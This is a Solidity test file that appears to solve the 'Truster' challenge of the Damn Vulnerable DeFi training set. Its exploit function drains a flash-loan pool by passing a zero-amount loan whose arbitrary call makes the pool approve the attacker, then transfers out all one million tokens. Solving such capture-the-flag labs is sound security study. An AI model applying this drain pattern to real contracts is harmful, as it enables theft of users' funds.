// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrusterLenderPool} from "dvd-v3/truster/TrusterLenderPool.sol";
import {Challenge} from "./utils/Challenge.sol";

contract Truster is Challenge {
    uint256 constant public TOKENS_IN_POOL = 1_000_000e18;
    TrusterLenderPool internal tlp;

    function setUp() public {
        newActors(1e18, 1e18);
        vm.startPrank(deployer);
        deployDVT();
        tlp = new TrusterLenderPool(dvt);
        vm.stopPrank();

        assertEq(address(tlp.token()), address(dvt));
        deal({token: address(dvt), to: address(tlp), give: TOKENS_IN_POOL});
        assertEq(dvt.balanceOf(address(tlp)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(address(attacker)), 0);
    }

    function test_ExploitTruster() public {
        // flashloan 0 with target as dvt and function call be approve
        vm.startPrank(attacker);
        tlp.flashLoan(0, address(attacker), address(dvt), abi.encodeWithSignature("approve(address,uint256)", address(attacker), TOKENS_IN_POOL));
        dvt.transferFrom(address(tlp), address(attacker), TOKENS_IN_POOL);
        validation();
    }

    function validation() public override {
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(address(tlp)), 0);
    }
}